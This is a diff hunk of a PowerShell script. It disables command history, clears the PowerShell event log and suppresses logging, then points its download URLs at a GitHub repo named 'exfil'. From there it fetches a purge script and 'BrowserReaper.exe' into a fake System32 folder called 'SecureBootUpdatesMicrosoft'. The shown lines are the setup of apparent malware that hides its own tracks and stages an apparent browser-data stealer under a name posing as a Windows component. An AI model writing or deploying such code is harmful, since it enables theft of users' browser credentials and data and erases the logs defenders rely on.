@@ -4,8 +4,8 @@ Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
 Clear-EventLog "Windows Powershell"
 $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
-$basepathcleaknupurl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Sanitation/BasePathPurge.ps1"
-$reaperurl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/BrowserReaper.exe"
+$basepathcleaknupurl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Sanitation/BasePathPurge.ps1"
+$reaperurl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/BrowserReaper.exe"
 $basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft"
 $reaperpath = Join-Path -Path $basepath -ChildPath "reaper.exe"
 
